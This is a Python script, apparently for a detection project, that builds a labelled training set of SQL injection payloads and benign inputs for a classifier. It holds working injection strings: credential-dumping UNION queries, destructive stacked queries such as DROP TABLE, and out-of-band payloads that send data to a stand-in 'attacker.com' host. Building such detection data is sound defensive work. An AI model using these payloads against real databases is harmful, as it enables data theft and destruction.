import os
import csv
import random

def generate_hybrid_dataset():
    # Setup directories
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    raw_dir = os.path.join(base_dir, 'datasets', 'raw')
    os.makedirs(raw_dir, exist_ok=True)
    
    # 1. In-band SQLi
    in_band_sqli = [
        "' OR '1'='1",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "1' OR 'x'='x",
        "1\" OR \"x\"=\"x",
        "' OR 2=2 --",
        "1 OR 1=1",
        "1' OR 1=1",
        "1\" OR 1=1",
        "' OR ''='",
        "admin' OR 'a'='a",
        "1' OR 1=1 LIMIT 1",
        "1' OR 1=1 LIMIT 1 --",
        "1' OR '1'='1'/*"
    ]
    
    # 2. UNION SQLi
    union_sqli = [
        "1 UNION SELECT 1, 2, 3",
        "1' UNION SELECT null, null, null --",
        "1\" UNION SELECT null, null --",
        "1 UNION SELECT username, password FROM users",
        "1' UNION SELECT username, password FROM users --",
        "1' UNION SELECT null, username, password FROM users --",
        "1' UNION SELECT @@version, null, null --",
        "1' UNION SELECT null, user(), database() --",
        "1 UNION ALL SELECT 1,2,3,4--",
        "1' UNION ALL SELECT null, null, null --",
        "1' UNION SELECT null, table_name FROM information_schema.tables --",
        "1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --"
    ]
    
    # 3. Error-Based SQLi
    error_sqli = [
        "1' AND extractvalue(1, concat(char(126), md5(123)))--",
        "1' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",
        "1' AND (SELECT 1 FROM (SELECT count(*), concat(floor(rand(0)*2), database())x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND convert(int, @@version)--",
        "1' AND cast(@@version as int)--",
        "1' AND 1=utl_inaddr.get_host_name((select user from dual))--"
    ]
    
    # 4. Blind SQLi (Time-Based & Conditional)
    blind_sqli = [
        # Conditional / Boolean
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND (SELECT 1) = 1--",
        "1' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin') > 64--",
        "1' AND (SELECT user()) LIKE 'a%'--",
        "1' AND EXISTS(SELECT * FROM users)--",
        # Time-Based
        "1; SELECT pg_sleep(5)--",
        "1' AND (SELECT 5013 FROM (SELECT(SLEEP(5)))a)--",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))temp)--",
        "1' AND BENCHMARK(10000000,MD5(1))--"
    ]
    
    # 5. Stacked Queries
    stacked_sqli = [
        "1; DROP TABLE users; --",
        "1'; DROP TABLE logs; --",
        "1; DELETE FROM users; --",
        "1'; UPDATE users SET password='hacked' --",
        "1; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",
        "1'; CREATE TABLE hacked (info text); --"
    ]
    
    # 6. Second-Order SQLi
    second_order_sqli = [
        "admin'--",
        "new_user'/*",
        "'; UPDATE users SET role='admin' WHERE id=1; --",
        "test' OR 1=1 --",
        "admin' #",
        "admin'/*"
    ]
    
    # 7. Out-of-Band (OOB) SQLi
    oob_sqli = [
        "1' AND 1=OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes', 'SELECT * FROM master.dbo.sysprocesses')--",
        "1' AND (SELECT LOAD_FILE('\\\\attacker.com\\share\\file'))--",
        "1'; EXEC master..xp_dirtree '\\\\attacker.com\\share' --",
        "1' AND (SELECT UTL_HTTP.request('http://attacker.com/log') FROM dual)--",
        "1' AND (SELECT UTL_SMTP.connection('attacker.com') FROM dual)--",
        "1' AND (SELECT DBMS_LDAP.search('attacker.com') FROM dual)--"
    ]

    # Combine all SQLi categories
    all_sqli = in_band_sqli + union_sqli + error_sqli + blind_sqli + stacked_sqli + second_order_sqli + oob_sqli
    
    # Expand SQLi payloads to ensure a robust training dataset
    expanded_sqli = []
    for payload in all_sqli:
        expanded_sqli.append(payload)
        # Variations (uppercase, lowercase, url encoded, double url encoded)
        expanded_sqli.append(payload.lower())
        expanded_sqli.append(payload.upper())
        # Space comment variations
        expanded_sqli.append(payload.replace(" ", "/**/"))
    
    # Keep unique
    expanded_sqli = list(set(expanded_sqli))
    
    # Safe Payloads (normal web request parameters, strings, alphanumeric, search variables)
    safe_payloads = [
        "hello world",
        "search query for security systems",
        "how to learn python",
        "best models for classification",
        "scikit-learn tutorial for beginners",
        "react vite templates setup",
        "flask api blueprints guide",
        "sqlite database visual studio code",
        "SQL injection vs Cross Site Scripting",
        "understanding agentic coding and AI",
        "admin",
        "operator",
        "user123",
        "john.doe",
        "rishi",
        "alex_99",
        "sarah_smith",
        "guest_user",
        "root_admin",
        "security_analyst",
        "admin@suraksha.ai",
        "agent@suraksha.ai",
        "test@example.com",
        "john.doe@gmail.com",
        "info@security.org",
        "12345",
        "987654321",
        "abc123xyz",
        "session_key_98765",
        "abcdef1234567890",
        "UUID-992-104-12",
        "id=102",
        "page=5",
        "limit=20",
        "offset=0",
        "This is a safe comment written by a real user.",
        "Please select a book from the shelf.",
        "Let's review the reports tomorrow morning.",
        "The server is running smoothly.",
        "Wait for the process to complete before shut down.",
        "I need to delete my older account.",
        "Can you drop me a mail at info@security.org?",
        "Please sleep early, tomorrow is a busy day.",
        "The union of the two datasets was successful.",
        "We need to execute the plan on Monday.",
        "O'Connor",
        "O'Reilly",
        "d'Artagnan",
        "That's a great feature!",
        "It's 10:30 AM right now.",
        "Who's there?",
        "Users' passwords must be strong.",
        "Standard JSON format: {\"name\": \"Test\"}",
        "URL formatting: http://localhost:5000/api/health",
        "1 + 1 = 2",
        "3 * 4 = 12",
        "50% discount",
        "Total count: 100",
        "Rating: 4.5/5",
        "version 1.0.0-Beta",
        "We are importing scikit-learn and pandas.",
        "Training a Random Forest model on python.",
        "The accuracy of the model is 98.5%.",
        "Select * from the dashboard menu.",
        "Use the drop-down to filter records.",
        "Update the application version to 1.1.0.",
        "Delete the temporary files in logs.",
        "A secure password requires numbers and special characters.",
        "This is an empty string.",
        "Let's check the logs database for failures."
    ]

    # Ensure dataset is large enough (at least 200 SQLi, 200 Safe)
    while len(expanded_sqli) < 250:
        base = expanded_sqli[len(expanded_sqli) % len(expanded_sqli)]
        expanded_sqli.append(f"{base} -- {len(expanded_sqli)}")
        
    while len(safe_payloads) < 250:
        base = safe_payloads[len(safe_payloads) % len(safe_payloads)]
        safe_payloads.append(f"{base} {len(safe_payloads)}")

    # Combine alternating to mix
    dataset_rows = []
    for sqli, safe in zip(expanded_sqli[:250], safe_payloads[:250]):
        dataset_rows.append((sqli, 1))
        dataset_rows.append((safe, 0))
        
    output_file = os.path.join(raw_dir, 'dataset.csv')
    with open(output_file, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['payload', 'label'])
        writer.writerows(dataset_rows)
        
    print(f"Hybrid SQLi dataset generated at {output_file} with {len(dataset_rows)} rows.")

if __name__ == '__main__':
    generate_hybrid_dataset()
